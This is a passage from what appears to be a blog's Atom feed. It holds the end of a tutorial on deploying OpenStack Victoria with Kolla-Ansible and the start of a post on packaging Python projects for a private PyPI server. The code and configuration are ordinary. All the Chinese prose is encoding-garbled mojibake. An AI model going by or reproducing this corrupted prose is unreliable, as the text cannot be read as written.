class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/glance</span><br><span class="line"></span><br><span class="line"><span class="section">[nova-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/nova</span><br><span class="line"></span><br><span class="line"><span class="section">[neutron-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/neutron</span><br><span class="line"></span><br><span class="line"><span class="section">[heat-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/heat</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‡å®šè¯¥é…ç½®æ–‡ä»¶æ„å»ºé•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kolla-build --config-file ~/kolla/etc/kolla/kolla-build.conf</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/31/XHqEmYQgOL2lBU7.png"></p><h2 id="éƒ¨ç½²-OpenStack"><a href="#éƒ¨ç½²-OpenStack" class="headerlink" title="éƒ¨ç½² OpenStack"></a>éƒ¨ç½² OpenStack</h2><p>ä¿®æ”¹ multinode é…ç½®ï¼Œç¼–è¾‘æœ€å‰é¢çš„å‡ é¡¹ï¼Œå°†ç›®æ ‡ä¸»æœºè®¾ç½®ä¸º <code>openstack01</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[control]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[network]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[compute]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[monitoring]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[storage]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[deployment]</span></span><br><span class="line">localhost       ansible_connection=local</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æ˜¯å¦å¯è¾¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible -i ~/multinode all -m ping</span><br></pre></td></tr></table></figure><p>å‚ç…§åŸå§‹çš„é…ç½®ç¼–å†™ç²¾ç®€é…ç½®ï¼ˆåªè®¾ç½®ç”¨åˆ°çš„é€‰é¡¹ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆçš„ç¤ºä¾‹é…ç½®æ–‡ä»¶</span></span><br><span class="line">/etc/kolla/globals.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç²¾ç®€é…ç½®æ–‡ä»¶</span></span><br><span class="line">vim ~/globals.yml </span><br></pre></td></tr></table></figure><p>å†…å®¹å¦‚ä¸‹ï¼š</p><ul><li>æŒ‡å®šä½¿ç”¨æºç æ„å»ºçš„é•œåƒ <code>openstack_tag=victoria</code></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Valid options are [&#x27;centos&#x27;, &#x27;debian&#x27;, &#x27;rhel&#x27;, &#x27;ubuntu&#x27;]</span></span><br><span class="line">kolla_base_distro: &quot;ubuntu&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Valid options are [ binary, source ]</span></span><br><span class="line">kolla_install_type: &quot;source&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do not override this unless you know what you are doing.</span></span><br><span class="line">openstack_release: &quot;victoria&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker image tag used by default.</span></span><br><span class="line">openstack_tag: &quot;victoria&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This should be a VIP, an unused IP on your network that will float between</span></span><br><span class="line"><span class="comment"># the hosts running keepalived for high-availability. If you want to run an</span></span><br><span class="line"><span class="comment"># All-In-One without haproxy and keepalived, you can set enable_haproxy to no</span></span><br><span class="line"><span class="comment"># in &quot;OpenStack options&quot; section, and set this value to the IP of your</span></span><br><span class="line"><span class="comment"># &#x27;network_interface&#x27; as set in the Networking section below.</span></span><br><span class="line">kolla_internal_vip_address: &quot;10.111.1.251&quot; # å’Œ network_interface åŒç½‘æ®µ</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom docker registry settings:</span></span><br><span class="line">docker_registry: 10.111.1.125:5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Namespace of images:</span></span><br><span class="line"><span class="comment">#docker_namespace: &quot;kolla&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This interface is what all your api services will be bound to by default.</span></span><br><span class="line"><span class="comment"># Additionally, all vxlan/tunnel and storage network traffic will go over this</span></span><br><span class="line"><span class="comment"># interface by default. This interface must contain an IP address.</span></span><br><span class="line"><span class="comment"># It is possible for hosts to have non-matching names of interfaces - these can</span></span><br><span class="line"><span class="comment"># be set in an inventory file per host or per group or stored separately, see</span></span><br><span class="line"><span class="comment">#     http://docs.ansible.com/ansible/intro_inventory.html</span></span><br><span class="line"><span class="comment"># Yet another way to workaround the naming problem is to create a bond for the</span></span><br><span class="line"><span class="comment"># interface on all hosts and give the bond name here. Similar strategy can be</span></span><br><span class="line"><span class="comment"># followed for other types of interfaces.</span></span><br><span class="line">network_interface: &quot;ens160&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the raw interface given to neutron as its external network port. Even</span></span><br><span class="line"><span class="comment"># though an IP address can exist on this interface, it will be unusable in most</span></span><br><span class="line"><span class="comment"># configurations. It is recommended this interface not be configured with any IP</span></span><br><span class="line"><span class="comment"># addresses for that reason.</span></span><br><span class="line">neutron_external_interface: &quot;ens192&quot; # ç©ºé—²ç½‘å¡</span><br><span class="line"></span><br><span class="line"><span class="comment"># Valid options are [ qemu, kvm, vmware ]</span></span><br><span class="line">nova_compute_virt_type: &quot;qemu&quot;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆéšæœºå¯†ç ï¼Œå¹¶æ‹·è´åˆ°å½“å‰ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯†ç </span></span><br><span class="line">kolla-genpwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´</span></span><br><span class="line">cp /etc/kolla/passwords.yml ~/passwords.yml</span><br></pre></td></tr></table></figure><p>éƒ¨ç½² OpenStack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bootstrap</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ bootstrap-servers</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ prechecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹‰å–é•œåƒ</span></span><br><span class="line"><span class="comment"># kolla-ansible -i ~/multinode --configdir ~ pull</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ deploy</span><br><span class="line"><span class="comment"># kolla-ansible -i ~/multinode --configdir ~ reconfigure</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²å¤±è´¥</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ destroy --yes-i-really-really-mean-it</span><br></pre></td></tr></table></figure><h1 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h1><p>åœ¨éƒ¨ç½²èŠ‚ç‚¹ä¸Šæ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œç”Ÿæˆèº«ä»½è®¤è¯æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… OpenStack CLI å®¢æˆ·ç«¯</span></span><br><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆè®¤è¯æ–‡ä»¶</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ post-deploy</span><br><span class="line"></span><br><span class="line"><span class="comment"># èº«ä»½è®¤è¯</span></span><br><span class="line">. ~/admin-openrc.sh</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Kolla-Ansible è‡ªå¸¦çš„è„šæœ¬æµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰§è¡Œè„šæœ¬ç”Ÿæˆç¤ºä¾‹ç½‘ç»œã€é•œåƒã€å®ä¾‹ç­‰</span></span><br><span class="line">~/code/share/kolla-ansible/init-runonce</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®ä¾‹</span></span><br><span class="line">openstack server create \</span><br><span class="line">    --image cirros \</span><br><span class="line">    --flavor m1.tiny \</span><br><span class="line">    --key-name mykey \</span><br><span class="line">    --network demo-net \</span><br><span class="line">    demo1</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤å®ä¾‹çŠ¶æ€</span></span><br><span class="line">openstack server list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/31/RYBPvwHzVpFrm84.jpg" width="80%"><p>ç›´æ¥è®¿é—® <a href="http://10.111.1.250/">http://10.111.1.250</a> å¯ä»¥çœ‹åˆ°åˆšæ‰åˆ›å»ºçš„å®ä¾‹æ‰€å ç”¨çš„èµ„æº</p><ul><li>ç”¨æˆ·åå¯†ç æŸ¥çœ‹ admin-openrc.sh æ–‡ä»¶å³å¯</li></ul><p><img src="https://i.loli.net/2021/08/31/QFzHXR43DqjsdwO.png"></p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://github.com/Joxit/docker-registry-ui">Joxit/docker-registry-ui</a></li><li><a href="https://www.cnblogs.com/huangxincheng/p/11131623.html">8å¤©å…¥é—¨dockerç³»åˆ— â€”â€” ç¬¬å…­å¤© æ­å»ºè‡ªå·±çš„ç§æœ‰é•œåƒä»“åº“Registry</a></li><li><a href="https://docs.docker.com/registry/configuration/">Configuring a registry</a></li><li><a href="https://docs.openstack.org/kolla/latest/admin/image-building.html">Building Container Images</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/quickstart.html">Kolla-Ansible - Quick Start</a></li><li><a href="https://docs.openstack.org/kolla/latest/contributor/genconfig.html">Generating kolla-build.conf</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/security.html">Kolla Security</a></li><li><a href="https://timonweb.com/devops/how-to-enable-passwordless-sudo-for-a-specific-user-in-linux/">How To Enable Passwordless Sudo For A Specific User in Linux</a></li><li><a href="https://blog.csdn.net/qq_28513801/article/details/116035363">ä½¿ç”¨kolla-ansibleéƒ¨ç½²å¤šèŠ‚ç‚¹OpenStack(Tç‰ˆ)åŠå¯¹æ¥Ceph</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ Kolla-Ansible çš„ multinode é…ç½®è¿œç¨‹éƒ¨ç½² OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Python é¡¹ç›®æ‰“åŒ…å¹¶å‘å¸ƒåˆ°ç§æœ‰ PyPI æœåŠ¡å™¨</title>
    <link href="https://jckling.github.io/2021/08/23/Other/Python%20%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0%E7%A7%81%E6%9C%89%20PyPI%20%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://jckling.github.io/2021/08/23/Other/Python%20%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0%E7%A7%81%E6%9C%89%20PyPI%20%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-08-23T03:01:14.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æäº†ä¸€ä¸ªæ–°éœ€æ±‚ï¼Œè¦æŠŠå¼€å‘çš„ Python é¡¹ç›®å‘å¸ƒåˆ° PyPI ä¸Šï¼Œä½†å› ä¸ºéœ€è¦ä¿å¯†ï¼Œæ‰€ä»¥å¾—è‡ªå·±æ­å»ºä¸€ä¸ªå†…éƒ¨çš„ PyPI æœåŠ¡å™¨ğŸ˜“</p><h1 id="Python-é¡¹ç›®æ‰“åŒ…"><a href="#Python-é¡¹ç›®æ‰“åŒ…" class="headerlink" title="Python é¡¹ç›®æ‰“åŒ…"></a>Python é¡¹ç›®æ‰“åŒ…</h1><h2 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h2><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªå¾…å‘å¸ƒçš„æ–‡ä»¶å¤¹ <code>packaging</code>ï¼Œæ•´ç†ä¸€ä¸‹é¡¹ç›®ç»“æ„å¹¶æ·»åŠ å‡ ä¸ªå¿…è¦çš„æ–‡ä»¶ï¼ˆ<code>LICENSE</code>ã€<code>README.md</code>ã€<code>setup.py</code>ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">packaging</span><br><span class="line">â”œâ”€â”€ my_project</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ module1</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ hello.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ module2</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ bye.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ utils.py</span><br><span class="line">â”œâ”€â”€ LICENSE</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â””â”€â”€ setup.py  <span class="comment"># æˆ– setup.cfg</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹å·¥ç¨‹å¾ˆç®€å•ï¼Œæ‰€æœ‰ <code>__init__.py</code> éƒ½æ˜¯ç©ºæ–‡ä»¶ï¼Œå…¶ä»–æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><ol><li><p>hello.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    print(<span class="string">&quot;hello world!&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>bye.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goodbye</span>():</span></span><br><span class="line">    print(<span class="string">&quot;goodbye!&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>utils.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&quot;A demo project for packaging.&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="é€‰æ‹©è®¸å¯è¯"><a href="#é€‰æ‹©è®¸å¯è¯" class="headerlink" title="é€‰æ‹©è®¸å¯è¯"></a>é€‰æ‹©è®¸å¯è¯</h2><p>PyPI è¦æ±‚æ‰€æœ‰ä¸Šä¼ çš„åŒ…éƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªè®¸å¯è¯ï¼Œåˆ©ç”¨ <a href="https://choosealicense.com/">https://choosealicense.com/</a> å¸®åŠ©é€‰æ‹©è®¸å¯è¯ï¼Œç„¶åå°†è®¸å¯è¯å†…å®¹å¤åˆ¶åˆ° <code>LICENSE</code> æ–‡ä»¶ä¸­ã€‚</p><p><em>æ³¨æ„æœ‰äº›è®¸å¯è¯éœ€è¦å¡«å…¥å¹´ä»½ï¼ˆ<code>[year]</code>ï¼‰å’Œæ‰€æœ‰è€…ï¼ˆ<code>[fullname]</code> æˆ– <code>[name of copyright owner]</code>ï¼‰</em></p><p>ä¾‹å¦‚ï¼ŒMIT è®¸å¯è¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">MIT License</span><br><span class="line"></span><br><span class="line">Copyright (c) [2021] [my_project]</span><br><span class="line"></span><br><span class="line">Permission is hereby granted, free of charge, to any person obtaining a copy</span><br><span class="line">of this software and associated documentation files (the &quot;Software&quot;), to deal</span><br><span class="line">in the Software without restriction, including without limitation the rights</span><br><span class="line">to use, copy, modify, merge, publish, distribute, sublicense, and&#x2F;or sell</span><br><span class="line">copies of the Software, and to permit persons to whom the Software is</span><br><span class="line">furnished to do so, subject to the following conditions:</span><br><span class="line"></span><br><span class="line">The above copyright notice and this permission notice shall be included in all</span><br><span class="line">copies or substantial portions of the Software.</span><br><span class="line"></span><br><span class="line">THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span><br><span class="line">IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span><br><span class="line">FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span><br><span class="line">AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span><br><span class="line">LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span><br><span class="line">OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span><br><span class="line">SOFTWARE.</span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™è¯´æ˜"><a href="#ç¼–å†™è¯´æ˜" class="headerlink" title="ç¼–å†™è¯´æ˜"></a>ç¼–å†™è¯´æ˜</h2><p>æ ¹æ® markdown è¯­æ³•ç¼–å†™é¡¹ç›®çš„è¯¦ç»†è¯´æ˜ï¼Œä¹‹åå¯ä»¥ä½œä¸º <code>setup.py</code> ä¸­çš„ <code>long_description</code> é¡¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Example Package</span><br><span class="line"></span><br><span class="line">This is a simple example package. You can use</span><br><span class="line">[Github-flavored Markdown](https:&#x2F;&#x2F;guides.github.com&#x2F;features&#x2F;mastering-markdown&#x2F;)</span><br><span class="line">to write your content.</span><br></pre></td></tr></table></figure><h2 id="é…ç½®å…ƒæ•°æ®"><a href="#é…ç½®å…ƒæ•°æ®" class="headerlink" title="é…ç½®å…ƒæ•°æ®"></a>é…ç½®å…ƒæ•°æ®</h2><p>æœ‰ä¸¤ç§å…ƒæ•°æ®ç±»å‹ï¼šé™æ€å…ƒæ•°æ®ï¼ˆ<code>setup.cfg</code>ï¼‰å’ŒåŠ¨æ€å…ƒæ•°æ®ï¼ˆ<code>setup.py</code>ï¼‰ï¼Œå®˜æ–¹æ¨èé¦–é€‰é™æ€å…ƒæ•°æ®ã€‚</p><h3 id="é™æ€"><a href="#é™æ€" class="headerlink" title="é™æ€"></a>é™æ€</h3><p>ä¸‹é¢æ˜¯å®˜æ–¹ç¤ºä¾‹çš„ <code>setup.cfg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[metadata]</span><br><span class="line">name &#x3D; example-pkg-YOUR-USERNAME-HERE</span><br><span class="line">version &#x3D; 0.0.1</span><br><span class="line">author &#x3D; Example Author</span><br><span class="line">author_email &#x3D; author@example.com</span><br><span class="line">description &#x3D; A small example package</span><br><span class="line">long_description &#x3D; file: README.md</span><br><span class="line">long_description_content_type &#x3D; text&#x2F;markdown</span><br><span class="line">url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;sampleproject</span><br><span class="line">project_urls &#x3D;</span><br><span class="line">    Bug Tracker &#x3D; https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;sampleproject&#x2F;issues</span><br><span class="line">classifiers &#x3D;</span><br><span class="line">    Programming Language :: Python :: 3</span><br><span class="line">    License :: OSI Approved :: MIT License</span><br><span class="line">    Operating System :: OS Independent</span><br><span class="line"></span><br><span class="line">[options]</span><br><span class="line">package_dir &#x3D;</span><br><span class="line">    &#x3D; src</span><br><span class="line">packages &#x3D; find:</span><br><span class="line">python_requires &#x3D; &gt;&#x3D;3.6</span><br><span class="line"></span><br><span class="line">[options.packages.find]</span><br><span class="line">where &#x3D; src</span><br></pre></td></tr></table></figure><table><thead><tr><th>å­—æ®µåç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>name</code></td><td>å¦‚æœè¦å‘å¸ƒåœ¨ pypi.org ä¸Šï¼Œåç§°å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œåªèƒ½ç”±è‹±æ–‡å­—æ¯ã€<code>_</code>ã€<code>-</code> ç»„æˆ</td></tr><tr><td><code>author</code>ã€<code>author_email</code></td><td>æ ‡è¯†ä½œè€…</td></tr><tr><td><code>description</code></td><td>åŒ…çš„ç®€çŸ­ä»‹ç»</td></tr><tr><td><code>long_description</code></td><td>åŒ…çš„è¯¦ç»†ä»‹ç»ï¼Œå¯ä»¥æŒ‡å®šè¯´æ˜æ–‡ä»¶</td></tr><tr><td><code>url</code></td><td>é¡¹ç›®ä¸»é¡µ</td></tr><tr><td><code>project_urls</code></td><td>å’Œé¡¹ç›®ç›¸å…³çš„é¢å¤–é“¾æ¥</td></tr><tr><td><code>classifiers</code></td><td>é™„åŠ å…ƒæ•°æ®ï¼Œä¾‹å¦‚è®¸å¯è¯ã€å…¼å®¹ã€‚å®Œæ•´åˆ—è¡¨è§ <a href="https://pypi.org/classifiers/">https://pypi.org/classifiers/</a></td></tr></tbody></table><h3 id="åŠ¨æ€"><a href="#åŠ¨æ€" class="headerlink" title="åŠ¨æ€"></a>åŠ¨æ€</h3><p>å®˜æ–¹ç¤ºä¾‹çš„ <code>setup.py</code>ï¼Œå¯ä»¥çœ‹å‡ºå­—æ®µåŸºæœ¬æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ç°æˆçš„æ¨¡æ¿è¿›è¡Œç¼–å†™ï¼š<a href="https://github.com/kennethreitz/setup.py/blob/master/setup.py">kennethreitz/setup.py</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">    long_description = fh.read()</span><br><span class="line"></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">&quot;example-pkg-YOUR-USERNAME-HERE&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    author=<span class="string">&quot;Example Author&quot;</span>,</span><br><span class="line">    author_email=<span class="string">&quot;author@example.com&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">    long_description=long_description,</span><br><span class="line">    long_description_content_type=<span class="string">&quot;text/markdown&quot;</span>,</span><br><span class="line">    url=<span class="string">&quot;https://github.com/pypa/sampleproject&quot;</span>,</span><br><span class="line">    project_urls=&#123;</span><br><span class="line">        <span class="string">&quot;Bug Tracker&quot;</span>: <span class="string">&quot;https://github.com/pypa/sampleproject/issues&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    package_dir=&#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;src&quot;</span>&#125;,</span><br><span class="line">    packages=setuptools.find_packages(where=<span class="string">&quot;src&quot;</span>),</span><br><span class="line">    python_requires=<span class="string">&quot;&gt;=3.6&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œå¯ä»¥æŠŠ <code>setup.cfg</code> 